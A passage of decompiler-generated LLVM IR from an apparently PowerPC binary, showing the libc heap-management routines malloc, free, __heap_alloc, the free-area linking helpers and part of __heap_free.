  store i32 %v0_1000acd4, i32* %r3.global-to-local, align 4
  %v3_1000acd8 = icmp eq i32 %v3_1000acc8, 0
  br i1 %v3_1000acd8, label %dec_label_pc_1000ace0, label %dec_label_pc_1000ad90.thread

dec_label_pc_1000ad90.thread:                     ; preds = %dec_label_pc_1000aca4
  br label %dec_label_pc_1000ada4

dec_label_pc_1000ace0:                            ; preds = %dec_label_pc_1000aca4
  %v3_1000ace4 = load i32, i32* @global_var_1001fddc.207, align 4
  store i32 %v3_1000ace4, i32* %r31.global-to-local, align 4
  %v3_1000ace8 = load i32, i32* %stack_var_-40, align 4
  %v2_1000acec = icmp ult i32 %v3_1000ace8, %v3_1000ace4
  br i1 %v2_1000acec, label %dec_label_pc_1000ad04, label %dec_label_pc_1000acf4

dec_label_pc_1000acf4:                            ; preds = %dec_label_pc_1000ace0
  %v1_1000acf8 = sub i32 0, %v3_1000ace4
  %v2_1000acf4 = add i32 %v3_1000ace4, -1
  %v1_1000acfc = add i32 %v2_1000acf4, %v3_1000ace8
  %v2_1000ad00 = and i32 %v1_1000acfc, %v1_1000acf8
  store i32 %v2_1000ad00, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ad04

dec_label_pc_1000ad04:                            ; preds = %dec_label_pc_1000ace0, %dec_label_pc_1000acf4
  store i32 ptrtoint (i32* @global_var_10025ec8.208 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ad10 = call i32 @__pthread_return_0()
  %v0_1000ad14 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000ad14, i32* %r3.global-to-local, align 4
  store i32 268479772, i32* @lr, align 4
  %v1_1000ad18 = call i32 @__GI_sbrk(i32 %v0_1000ad14)
  store i32 %v1_1000ad18, i32* %r3.global-to-local, align 4
  %v3_1000ad1c = icmp eq i32 %v1_1000ad18, -1
  br i1 %v3_1000ad1c, label %dec_label_pc_1000ad3c, label %dec_label_pc_1000ad24

dec_label_pc_1000ad24:                            ; preds = %dec_label_pc_1000ad04
  %v1_1000ad24 = add i32 %v1_1000ad18, 3
  %v1_1000ad28 = call i32 @__asm_rlwinm(i32 %v1_1000ad24, i32 0, i32 0, i32 29)
  store i32 %v1_1000ad28, i32* @r30, align 4
  %v4_1000ad2c = icmp eq i32 %v1_1000ad28, %v1_1000ad18
  br i1 %v4_1000ad2c, label %dec_label_pc_1000ad3c, label %dec_label_pc_1000ad34

dec_label_pc_1000ad34:                            ; preds = %dec_label_pc_1000ad24
  %v2_1000ad34 = sub i32 %v1_1000ad28, %v1_1000ad18
  store i32 %v2_1000ad34, i32* %r3.global-to-local, align 4
  store i32 268479804, i32* @lr, align 4
  %v1_1000ad38 = call i32 @__GI_sbrk(i32 %v2_1000ad34)
  store i32 %v1_1000ad38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ad3c

dec_label_pc_1000ad3c:                            ; preds = %dec_label_pc_1000ad24, %dec_label_pc_1000ad04, %dec_label_pc_1000ad34
  store i32 ptrtoint (i32* @global_var_10025ec8.208 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ad44 = call i32 @__pthread_return_0()
  store i32 %v0_1000ad44, i32* %r3.global-to-local, align 4
  %v0_1000ad48 = load i32, i32* @r30, align 4
  %v3_1000ad48 = icmp eq i32 %v0_1000ad48, -1
  br i1 %v3_1000ad48, label %dec_label_pc_1000adac, label %dec_label_pc_1000ad90

dec_label_pc_1000ad90:                            ; preds = %dec_label_pc_1000ad3c
  store i32 ptrtoint (i32* @global_var_10025e30.204 to i32), i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001fd90 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10025e30.204 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ad64 = call i32 @__pthread_return_0()
  %v0_1000ad68 = load i32, i32* @r31, align 4
  %v0_1000ad6c = load i32, i32* @r30, align 4
  %v0_1000ad70 = load i32, i32* @r29, align 4
  store i32 %v0_1000ad70, i32* %r3.global-to-local, align 4
  store i32 268479864, i32* @lr, align 4
  %v3_1000ad74 = inttoptr i32 %v0_1000ad70 to i32*
  %v4_1000ad74 = call i32 @__heap_free(i32* %v3_1000ad74, i32 %v0_1000ad6c, i32 %v0_1000ad68)
  %v0_1000ad78 = load i32, i32* @r29, align 4
  store i32 %v0_1000ad78, i32* %r3.global-to-local, align 4
  %v2_1000ad80 = inttoptr i32 %v0_1000ad78 to i32*
  %v3_1000ad80 = call i32 @__heap_alloc(i32* %v2_1000ad80, i32 %v2_1000acc0)
  store i32 %v3_1000ad80, i32* %r31.global-to-local, align 4
  %v0_1000ad88 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000ad88, i32* %r3.global-to-local, align 4
  %v0_1000ad8c = call i32 @__pthread_return_0()
  store i32 %v0_1000ad8c, i32* %r3.global-to-local, align 4
  %v3_1000ad90 = icmp eq i32 %v3_1000ad80, 0
  br i1 %v3_1000ad90, label %dec_label_pc_1000ada4.thread, label %dec_label_pc_1000ada4

dec_label_pc_1000ada4.thread:                     ; preds = %dec_label_pc_1000ad90
  br label %dec_label_pc_1000adac

dec_label_pc_1000ada4:                            ; preds = %dec_label_pc_1000ad90, %dec_label_pc_1000ad90.thread
  %v0_1000ada4.pr6 = phi i32 [ %v3_1000acc8, %dec_label_pc_1000ad90.thread ], [ %v3_1000ad80, %dec_label_pc_1000ad90 ]
  %v3_1000ad98 = load i32, i32* %stack_var_-40, align 4
  %v2_1000ad9c = inttoptr i32 %v0_1000ada4.pr6 to i32*
  store i32 %v3_1000ad98, i32* %v2_1000ad9c, align 4
  %v0_1000ada0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ada0 = add i32 %v0_1000ada0, 4
  %v3_1000ada4 = icmp eq i32 %v1_1000ada0, 0
  br i1 %v3_1000ada4, label %dec_label_pc_1000adac, label %dec_label_pc_1000adbc

dec_label_pc_1000adac:                            ; preds = %dec_label_pc_1000ada4.thread, %dec_label_pc_1000ada4, %dec_label_pc_1000ad3c, %dec_label_pc_1000ac98
  %v0_1000adac = call i32 @__errno_location()
  store i32 %v0_1000adac, i32* %r3.global-to-local, align 4
  %v2_1000adb4 = inttoptr i32 %v0_1000adac to i32*
  store i32 12, i32* %v2_1000adb4, align 4
  br label %dec_label_pc_1000adbc

dec_label_pc_1000adbc:                            ; preds = %dec_label_pc_1000ada4, %dec_label_pc_1000adac
  %v0_1000adc0 = phi i32 [ %v1_1000ada0, %dec_label_pc_1000ada4 ], [ 0, %dec_label_pc_1000adac ]
  store i32 %v0_1000adc0, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000adc0

; uselistorder directives
  uselistorder i32 %v0_1000adc0, { 1, 0 }
  uselistorder i32 %v1_1000ada0, { 1, 0 }
  uselistorder i32 %v1_1000ad28, { 1, 0, 2 }
  uselistorder i32 %v1_1000ad18, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_1000ace4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000acc8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 15, 16, 3, 5, 4, 6, 17, 7, 18, 8, 19, 10, 9, 20, 11, 12, 13, 14, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10025e30.204 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000adbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000adac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000ad3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ad04, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac98, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %v3_1000add4 = icmp eq i32 %arg1, 0
  br i1 %v3_1000add4, label %dec_label_pc_1000aec0, label %dec_label_pc_1000adec

dec_label_pc_1000adec:                            ; preds = %entry
  %v1_1000adf0 = add i32 %arg1, -4
  %v2_1000adf0 = inttoptr i32 %v1_1000adf0 to i32*
  %v3_1000adf0 = load i32, i32* %v2_1000adf0, align 4
  %v0_1000ae04 = call i32 @__pthread_return_0()
  store i32 268480024, i32* @lr, align 4
  %v4_1000ae14 = call i32 @__heap_free(i32* nonnull @global_var_1001fd90, i32 %v1_1000adf0, i32 %v3_1000adf0)
  %v3_1000ae1c = load i32, i32* @global_var_1001fddc.207, align 4
  store i32 %v4_1000ae14, i32* @r29, align 4
  %v1_1000ae24 = inttoptr i32 %v4_1000ae14 to i32*
  %v2_1000ae24 = load i32, i32* %v1_1000ae24, align 4
  store i32 %v2_1000ae24, i32* %r27.global-to-local, align 4
  %v1_1000ae28 = mul i32 %v3_1000ae1c, 8
  %v2_1000ae2c = icmp ult i32 %v2_1000ae24, %v1_1000ae28
  br i1 %v2_1000ae2c, label %dec_label_pc_1000ae60, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %dec_label_pc_1000adec
  %v0_1000ae44 = call i32 @__pthread_return_0()
  store i32 268480080, i32* @lr, align 4
  %v1_1000ae4c = call i32 @__GI_sbrk(i32 0)
  %v0_1000ae50 = load i32, i32* @r31, align 4
  %v4_1000ae50 = icmp eq i32 %v0_1000ae50, %v1_1000ae4c
  br i1 %v4_1000ae50, label %dec_label_pc_1000ae68, label %dec_label_pc_1000ae58

dec_label_pc_1000ae58:                            ; preds = %dec_label_pc_1000ae34
  %v0_1000ae5c = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000ae60

dec_label_pc_1000ae60:                            ; preds = %dec_label_pc_1000adec, %dec_label_pc_1000ae58
  br label %dec_label_pc_1000aebc

dec_label_pc_1000ae68:                            ; preds = %dec_label_pc_1000ae34
  %v0_1000ae68 = load i32, i32* @r29, align 4
  %v1_1000ae68 = add i32 %v0_1000ae68, 4
  %v2_1000ae68 = inttoptr i32 %v1_1000ae68 to i32*
  %v3_1000ae68 = load i32, i32* %v2_1000ae68, align 4
  %v3_1000ae6c = icmp eq i32 %v3_1000ae68, 0
  br i1 %v3_1000ae6c, label %dec_label_pc_1000ae7c, label %dec_label_pc_1000ae74

dec_label_pc_1000ae74:                            ; preds = %dec_label_pc_1000ae68
  %v1_1000ae74 = add i32 %v0_1000ae68, 8
  %v2_1000ae74 = inttoptr i32 %v1_1000ae74 to i32*
  %v3_1000ae74 = load i32, i32* %v2_1000ae74, align 4
  %v2_1000ae78 = add i32 %v3_1000ae68, 8
  %v3_1000ae78 = inttoptr i32 %v2_1000ae78 to i32*
  store i32 %v3_1000ae74, i32* %v3_1000ae78, align 4
  %v0_1000ae7c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ae7c

dec_label_pc_1000ae7c:                            ; preds = %dec_label_pc_1000ae68, %dec_label_pc_1000ae74
  %v0_1000ae7c = phi i32 [ %v0_1000ae68, %dec_label_pc_1000ae68 ], [ %v0_1000ae7c.pre, %dec_label_pc_1000ae74 ]
  %v1_1000ae7c = add i32 %v0_1000ae7c, 8
  %v2_1000ae7c = inttoptr i32 %v1_1000ae7c to i32*
  %v3_1000ae7c = load i32, i32* %v2_1000ae7c, align 4
  %v1_1000ae80 = add i32 %v0_1000ae7c, 4
  %v2_1000ae80 = inttoptr i32 %v1_1000ae80 to i32*
  %v3_1000ae80 = load i32, i32* %v2_1000ae80, align 4
  %v3_1000ae84 = icmp eq i32 %v3_1000ae7c, 0
  br i1 %v3_1000ae84, label %dec_label_pc_1000ae94, label %dec_label_pc_1000ae8c

dec_label_pc_1000ae8c:                            ; preds = %dec_label_pc_1000ae7c
  %v2_1000ae8c = add i32 %v3_1000ae7c, 4
  %v3_1000ae8c = inttoptr i32 %v2_1000ae8c to i32*
  store i32 %v3_1000ae80, i32* %v3_1000ae8c, align 4
  br label %dec_label_pc_1000ae98

dec_label_pc_1000ae94:                            ; preds = %dec_label_pc_1000ae7c
  store i32 %v3_1000ae80, i32* @global_var_1001fd90, align 4
  br label %dec_label_pc_1000ae98

dec_label_pc_1000ae98:                            ; preds = %dec_label_pc_1000ae8c, %dec_label_pc_1000ae94
  %v0_1000aea0 = call i32 @__pthread_return_0()
  %v0_1000aea4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000aea4 = load i32, i32* @r29, align 4
  %v0_1000aeac = load i32, i32* @r31, align 4
  %v2_1000aea4 = sub i32 12, %v0_1000aea4
  %v1_1000aea8 = add i32 %v2_1000aea4, %v1_1000aea4
  %v2_1000aeac = sub i32 %v1_1000aea8, %v0_1000aeac
  store i32 268480180, i32* @lr, align 4
  %v1_1000aeb0 = call i32 @__GI_sbrk(i32 %v2_1000aeac)
  br label %dec_label_pc_1000aebc

dec_label_pc_1000aebc:                            ; preds = %dec_label_pc_1000ae60, %dec_label_pc_1000ae98
  %v0_1000aebc = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000aec0

dec_label_pc_1000aec0:                            ; preds = %entry, %dec_label_pc_1000aebc
  %v0_1000aed0 = phi i32 [ 0, %entry ], [ %v0_1000aebc, %dec_label_pc_1000aebc ]
  ret i32 %v0_1000aed0

; uselistorder directives
  uselistorder i32 %v0_1000ae7c, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1001fd90, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000aec0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aebc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae98, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae60, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000aed4 = inttoptr i32 %arg2 to i32*
  %v2_1000aed4 = load i32, i32* %v1_1000aed4, align 4
  %v1_1000aed8 = add i32 %v2_1000aed4, 3
  store i32 %v1_1000aed8, i32* %r9.global-to-local, align 4
  %v1_1000aedc = call i32 @__asm_rlwinm(i32 %v1_1000aed8, i32 0, i32 0, i32 29)
  %v2_1000aee0 = icmp ugt i32 %v1_1000aedc, 11
  br i1 %v2_1000aee0, label %dec_label_pc_1000af64.preheader, label %dec_label_pc_1000aee8

dec_label_pc_1000aee8:                            ; preds = %entry
  br label %dec_label_pc_1000af64.preheader

dec_label_pc_1000af64.preheader:                  ; preds = %entry, %dec_label_pc_1000aee8
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000aee8 ], [ %v1_1000aedc, %entry ]
  %v0_1000af48 = phi i32 [ 12, %dec_label_pc_1000aee8 ], [ %v1_1000aedc, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000af645 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000af645, label %dec_label_pc_1000af6c, label %dec_label_pc_1000aef4

dec_label_pc_1000aef4:                            ; preds = %dec_label_pc_1000af64.preheader, %dec_label_pc_1000af60
  %v0_1000af60 = phi i32 [ %storemerge, %dec_label_pc_1000af60 ], [ %storemerge2, %dec_label_pc_1000af64.preheader ]
  %v1_1000aef4 = inttoptr i32 %v0_1000af60 to i32*
  %v2_1000aef4 = load i32, i32* %v1_1000aef4, align 4
  store i32 %v2_1000aef4, i32* %r10.global-to-local, align 4
  %v2_1000aef8 = icmp ult i32 %v2_1000aef4, %v0_1000af48
  br i1 %v2_1000aef8, label %dec_label_pc_1000af60, label %dec_label_pc_1000af00

dec_label_pc_1000af00:                            ; preds = %dec_label_pc_1000aef4
  %v1_1000af00 = add i32 %v0_1000af48, 44
  %v2_1000af04 = icmp ult i32 %v2_1000aef4, %v1_1000af00
  br i1 %v2_1000af04, label %dec_label_pc_1000af0c, label %dec_label_pc_1000af48

dec_label_pc_1000af0c:                            ; preds = %dec_label_pc_1000af00
  %v1_1000af0c = add i32 %v0_1000af60, 4
  %v2_1000af0c = inttoptr i32 %v1_1000af0c to i32*
  %v3_1000af0c = load i32, i32* %v2_1000af0c, align 4
  store i32 %v3_1000af0c, i32* %r11.global-to-local, align 4
  %v3_1000af10 = icmp eq i32 %v3_1000af0c, 0
  br i1 %v3_1000af10, label %dec_label_pc_1000af20, label %dec_label_pc_1000af18

dec_label_pc_1000af18:                            ; preds = %dec_label_pc_1000af0c
  %v1_1000af18 = add i32 %v0_1000af60, 8
  %v2_1000af18 = inttoptr i32 %v1_1000af18 to i32*
  %v3_1000af18 = load i32, i32* %v2_1000af18, align 4
  %v2_1000af1c = add i32 %v3_1000af0c, 8
  %v3_1000af1c = inttoptr i32 %v2_1000af1c to i32*
  store i32 %v3_1000af18, i32* %v3_1000af1c, align 4
  %v0_1000af20.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000af3c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000af20

dec_label_pc_1000af20:                            ; preds = %dec_label_pc_1000af0c, %dec_label_pc_1000af18
  %v0_1000af3c = phi i32 [ %v2_1000aef4, %dec_label_pc_1000af0c ], [ %v0_1000af3c.pre, %dec_label_pc_1000af18 ]
  %v0_1000af20 = phi i32 [ %v0_1000af60, %dec_label_pc_1000af0c ], [ %v0_1000af20.pre, %dec_label_pc_1000af18 ]
  %v1_1000af20 = add i32 %v0_1000af20, 8
  %v2_1000af20 = inttoptr i32 %v1_1000af20 to i32*
  %v3_1000af20 = load i32, i32* %v2_1000af20, align 4
  %v1_1000af24 = add i32 %v0_1000af20, 4
  %v2_1000af24 = inttoptr i32 %v1_1000af24 to i32*
  %v3_1000af24 = load i32, i32* %v2_1000af24, align 4
  %v3_1000af28 = icmp eq i32 %v3_1000af20, 0
  store i32 %v0_1000af3c, i32* %r11.global-to-local, align 4
  br i1 %v3_1000af28, label %dec_label_pc_1000af3c, label %dec_label_pc_1000af30

dec_label_pc_1000af30:                            ; preds = %dec_label_pc_1000af20
  %v2_1000af34 = add i32 %v3_1000af20, 4
  %v3_1000af34 = inttoptr i32 %v2_1000af34 to i32*
  store i32 %v3_1000af24, i32* %v3_1000af34, align 4
  br label %dec_label_pc_1000af50

dec_label_pc_1000af3c:                            ; preds = %dec_label_pc_1000af20
  store i32 %v3_1000af24, i32* %arg1, align 4
  br label %dec_label_pc_1000af50

dec_label_pc_1000af48:                            ; preds = %dec_label_pc_1000af00
  %v2_1000af48 = sub i32 %v2_1000aef4, %v0_1000af48
  store i32 %v2_1000af48, i32* %v1_1000aef4, align 4
  br label %dec_label_pc_1000af50

dec_label_pc_1000af50:                            ; preds = %dec_label_pc_1000af3c, %dec_label_pc_1000af30, %dec_label_pc_1000af48
  %v0_1000af50 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000af50 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000af50 = sub i32 %v1_1000af50, %v0_1000af50
  store i32 %v2_1000af50, i32* %r9.global-to-local, align 4
  %v0_1000af54 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000af54, i32* %v1_1000aed4, align 4
  %v0_1000af58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000af58 = add i32 %v0_1000af58, 12
  ret i32 %v1_1000af58

dec_label_pc_1000af60:                            ; preds = %dec_label_pc_1000aef4
  %v1_1000af60 = add i32 %v0_1000af60, 4
  %storemerge.in = inttoptr i32 %v1_1000af60 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000af64 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000af64, label %dec_label_pc_1000af64.dec_label_pc_1000af6c_crit_edge, label %dec_label_pc_1000aef4

dec_label_pc_1000af64.dec_label_pc_1000af6c_crit_edge: ; preds = %dec_label_pc_1000af60
  br label %dec_label_pc_1000af6c

dec_label_pc_1000af6c:                            ; preds = %dec_label_pc_1000af64.dec_label_pc_1000af6c_crit_edge, %dec_label_pc_1000af64.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000af20, { 1, 0 }
  uselistorder i32 %v2_1000aef4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000af60, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000af48, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000af50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000af20, { 1, 0 }
  uselistorder label %dec_label_pc_1000aef4, { 1, 0 }
  uselistorder label %dec_label_pc_1000af64.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000af74 = icmp eq i32 %arg3, 0
  %v2_1000af78 = add i32 %arg2, 4
  %v3_1000af78 = inttoptr i32 %v2_1000af78 to i32*
  store i32 %arg4, i32* %v3_1000af78, align 4
  %v2_1000af7c = add i32 %arg2, 8
  %v3_1000af7c = inttoptr i32 %v2_1000af7c to i32*
  store i32 %arg3, i32* %v3_1000af7c, align 4
  br i1 %v3_1000af74, label %dec_label_pc_1000af8c, label %dec_label_pc_1000af84

dec_label_pc_1000af84:                            ; preds = %entry
  %v2_1000af84 = add i32 %arg3, 4
  %v3_1000af84 = inttoptr i32 %v2_1000af84 to i32*
  store i32 %arg2, i32* %v3_1000af84, align 4
  br label %dec_label_pc_1000af90

dec_label_pc_1000af8c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000af90

dec_label_pc_1000af90:                            ; preds = %dec_label_pc_1000af84, %dec_label_pc_1000af8c
  %v3_1000af90 = icmp eq i32 %arg4, 0
  %v0_1000af94 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000af90, i32 %v0_1000af94)
  %v2_1000af98 = add i32 %arg4, 8
  %v3_1000af98 = inttoptr i32 %v2_1000af98 to i32*
  store i32 %arg2, i32* %v3_1000af98, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1000af90, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000afa0 = icmp eq i32 %arg3, 0
  br i1 %v3_1000afa0, label %dec_label_pc_1000afb0, label %dec_label_pc_1000afa8

dec_label_pc_1000afa8:                            ; preds = %entry
  %v2_1000afa8 = add i32 %arg3, 4
  %v3_1000afa8 = inttoptr i32 %v2_1000afa8 to i32*
  store i32 %arg2, i32* %v3_1000afa8, align 4
  br label %dec_label_pc_1000afb4

dec_label_pc_1000afb0:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000afb4

dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000afa8, %dec_label_pc_1000afb0
  %v2_1000afb4 = add i32 %arg2, 8
  %v3_1000afb4 = inttoptr i32 %v2_1000afb4 to i32*
  store i32 %arg3, i32* %v3_1000afb4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afb4, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000afd4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000afd4, i32* @r31, align 4
  %v2_1000afd8 = add i32 %arg3, %arg2
  store i32 %v2_1000afd8, i32* %r3.global-to-local, align 4
  %v3_1000afec7 = icmp eq i32 %v2_1000afd4, 0
  %v1_1000aff08 = add i32 %v2_1000afd4, 12
  %tmp69 = icmp uge i32 %v1_1000aff08, %arg2
  %or.cond10 = or i1 %v3_1000afec7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000affc, label %dec_label_pc_1000afe4

dec_label_pc_1000afe4:                            ; preds = %entry, %dec_label_pc_1000afe4
  %v0_1000b04411 = phi i32 [ %v3_1000afe8, %dec_label_pc_1000afe4 ], [ %v2_1000afd4, %entry ]
  store i32 %v0_1000b04411, i32* %r11.global-to-local, align 4
  %v1_1000afe8 = add i32 %v0_1000b04411, 4
  %v2_1000afe8 = inttoptr i32 %v1_1000afe8 to i32*
  %v3_1000afe8 = load i32, i32* %v2_1000afe8, align 4
  store i32 %v3_1000afe8, i32* @r31, align 4
  %v3_1000afec = icmp eq i32 %v3_1000afe8, 0
  %v1_1000aff0 = add i32 %v3_1000afe8, 12
  %tmp6 = icmp uge i32 %v1_1000aff0, %arg2
  %or.cond = or i1 %v3_1000afec, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000affc, label %dec_label_pc_1000afe4

dec_label_pc_1000affc:                            ; preds = %dec_label_pc_1000afe4, %entry
  %v0_1000b038.lcssa = phi i32 [ 0, %entry ], [ %v0_1000b04411, %dec_label_pc_1000afe4 ]
  %v0_1000b044.lcssa = phi i32 [ %v2_1000afd4, %entry ], [ %v3_1000afe8, %dec_label_pc_1000afe4 ]
  %v3_1000afec.lcssa = phi i1 [ %v3_1000afec7, %entry ], [ %v3_1000afec, %dec_label_pc_1000afe4 ]
  br i1 %v3_1000afec.lcssa, label %dec_label_pc_1000b0b4, label %dec_label_pc_1000b004

dec_label_pc_1000b004:                            ; preds = %dec_label_pc_1000affc
  %v1_1000b004 = inttoptr i32 %v0_1000b044.lcssa to i32*
  %v2_1000b004 = load i32, i32* %v1_1000b004, align 4
  %v2_1000b008 = sub i32 %v0_1000b044.lcssa, %v2_1000b004
  %v1_1000b00c = add i32 %v2_1000b008, 12
  %v3_1000b010 = icmp ugt i32 %v1_1000b00c, %v2_1000afd8
  br i1 %v3_1000b010, label %dec_label_pc_1000b0b4, label %dec_label_pc_1000b018

dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000b004
  %v4_1000b010 = icmp eq i32 %v1_1000b00c, %v2_1000afd8
  %v2_1000b01c = add i32 %v2_1000b004, %arg3
  store i32 %v2_1000b01c, i32* @r29, align 4
  br i1 %v4_1000b010, label %dec_label_pc_1000b024, label %dec_label_pc_1000b054

dec_label_pc_1000b024:                            ; preds = %dec_label_pc_1000b018
  %v3_1000b024 = icmp eq i32 %v0_1000b038.lcssa, 0
  br i1 %v3_1000b024, label %dec_label_pc_1000b0a8, label %dec_label_pc_1000b02c

dec_label_pc_1000b02c:                            ; preds = %dec_label_pc_1000b024
  %v1_1000b02c = add i32 %v0_1000b038.lcssa, 12
  %v4_1000b030 = icmp eq i32 %v1_1000b02c, %arg2
  br i1 %v4_1000b030, label %dec_label_pc_1000b038, label %dec_label_pc_1000b0a8

dec_label_pc_1000b038:                            ; preds = %dec_label_pc_1000b02c
  %v1_1000b038 = inttoptr i32 %v0_1000b038.lcssa to i32*
  %v2_1000b038 = load i32, i32* %v1_1000b038, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000b040 = add i32 %v0_1000b038.lcssa, 8
  %v2_1000b040 = inttoptr i32 %v1_1000b040 to i32*
  %v3_1000b040 = load i32, i32* %v2_1000b040, align 4
  %v2_1000b048 = add i32 %v2_1000b038, %v2_1000b01c
  store i32 %v2_1000b048, i32* @r29, align 4
  %v5_1000b04c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000b044.lcssa, i32 %v3_1000b040, i32 %v2_1000afd8)
  store i32 %v5_1000b04c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b0a8

dec_label_pc_1000b054:                            ; preds = %dec_label_pc_1000b018
  %v1_1000b054 = add i32 %v0_1000b044.lcssa, 4
  %v2_1000b054 = inttoptr i32 %v1_1000b054 to i32*
  %v3_1000b054 = load i32, i32* %v2_1000b054, align 4
  %v3_1000b058 = icmp eq i32 %v3_1000b054, 0
  br i1 %v3_1000b058, label %dec_label_pc_1000b090, label %dec_label_pc_1000b060

dec_label_pc_1000b060:                            ; preds = %dec_label_pc_1000b054
  %v1_1000b060 = inttoptr i32 %v3_1000b054 to i32*
  %v2_1000b060 = load i32, i32* %v1_1000b060, align 4
  %v2_1000b064 = sub i32 %v3_1000b054, %v2_1000b060
  %v1_1000b068 = add i32 %v2_1000b064, 12
  %v4_1000b06c = icmp eq i32 %v2_1000afd8, %v1_1000b068
  br i1 %v4_1000b06c, label %dec_label_pc_1000b074, label %dec_label_pc_1000b090

dec_label_pc_1000b074:                            ; preds = %dec_label_pc_1000b060
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000b080 = add i32 %v2_1000b060, %v2_1000b01c
  store i32 %v2_1000b080, i32* @r29, align 4
